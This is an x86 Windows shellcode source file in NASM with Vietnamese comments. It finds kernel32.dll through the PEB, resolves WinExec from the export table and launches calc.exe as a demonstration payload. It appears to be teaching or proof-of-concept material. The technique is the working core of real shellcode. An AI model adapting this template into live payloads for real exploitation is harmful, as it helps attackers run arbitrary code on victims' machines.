; =================================================================
; File: shellcode.asm
; Trình biên dịch: NASM
; Kiến trúc: x86 (32-bit Windows)
; Mô tả: Position-Independent Shellcode mở calc.exe
; =================================================================

[BITS 32]
global _start

section .text
_start:
    ; -------------------------------------------------------------
    ; BƯỚC 1: Tìm địa chỉ nền (Base Address) của kernel32.dll
    ; -------------------------------------------------------------
    xor ecx, ecx                ; ECX = 0
    mov eax, [fs:ecx + 0x30]    ; EAX = Địa chỉ của cấu trúc PEB
    mov eax, [eax + 0x0c]       ; EAX = PEB_LDR_DATA
    mov esi, [eax + 0x14]       ; ESI = InMemoryOrderModuleList
    lodsd                       ; EAX = module thứ 2 (ntdll.dll)
    xchg eax, esi               ; 
    lodsd                       ; EAX = module thứ 3 (kernel32.dll)
    mov ebx, [eax + 0x10]       ; EBX = Base Address của kernel32.dll

    ; -------------------------------------------------------------
    ; BƯỚC 2: Duyệt Export Directory của kernel32.dll
    ; -------------------------------------------------------------
    mov edx, [ebx + 0x3c]       ; EDX = offset của PE Header (e_lfanew)
    add edx, ebx                ; EDX = địa chỉ PE Header
    mov edx, [edx + 0x78]       ; Lấy RVA của Export Directory
    add edx, ebx                ; EDX = địa chỉ Export Directory
    
    mov esi, [edx + 0x20]       ; Lấy RVA của mảng AddressOfNames
    add esi, ebx                ; ESI = địa chỉ mảng AddressOfNames
    xor ecx, ecx                ; ECX = Index = 0

find_winexec:
    mov eax, [esi + ecx * 4]    ; EAX = RVA của tên hàm thứ ECX
    add eax, ebx                ; EAX = Trỏ tới chuỗi tên hàm
    
    ; So sánh tên hàm với chuỗi 'WinExec'
    ; 'WinE' = 0x456E6957, 'xec\0' = 0x00636578
    cmp dword [eax], 0x456E6957 ; So sánh 4 byte đầu 'WinE'
    jnz next_func
    cmp word [eax + 4], 0x6578  ; So sánh 2 byte tiếp 'xe'
    jnz next_func
    cmp byte [eax + 6], 0x63    ; So sánh 1 byte 'c'
    jz found_winexec            ; Nếu khớp toàn bộ, nhảy tới hàm lấy địa chỉ

next_func:
    inc ecx                     ; Tăng Index
    jmp find_winexec            ; Tiếp tục vòng lặp

    ; -------------------------------------------------------------
    ; BƯỚC 3: Lấy địa chỉ thực của WinExec
    ; -------------------------------------------------------------
found_winexec:
    mov edi, [edx + 0x24]       ; RVA của AddressOfNameOrdinals
    add edi, ebx
    mov cx, [edi + ecx * 2]     ; Lấy số thứ tự (Ordinal) của hàm WinExec

    mov edi, [edx + 0x1c]       ; RVA của AddressOfFunctions
    add edi, ebx
    mov eax, [edi + ecx * 4]    ; EAX = RVA của hàm WinExec
    add eax, ebx                ; EAX = Địa chỉ thực thi của WinExec

    ; -------------------------------------------------------------
    ; BƯỚC 4: Thực thi WinExec("calc.exe", 1)
    ; -------------------------------------------------------------
    xor edx, edx                ; EDX = 0
    push edx                    ; Đẩy NULL byte vào stack (kết thúc chuỗi)
    push 0x6578652e             ; Đẩy ".exe" (đảo ngược do Little Endian)
    push 0x636c6163             ; Đẩy "calc"
    mov edx, esp                ; EDX trỏ tới chuỗi "calc.exe"

    push 1                      ; Đẩy tham số thứ hai (uCmdShow = 1)
    push edx                    ; Đẩy tham số thứ nhất (lpCmdLine = "calc.exe")
    call eax                    ; Gọi WinExec()
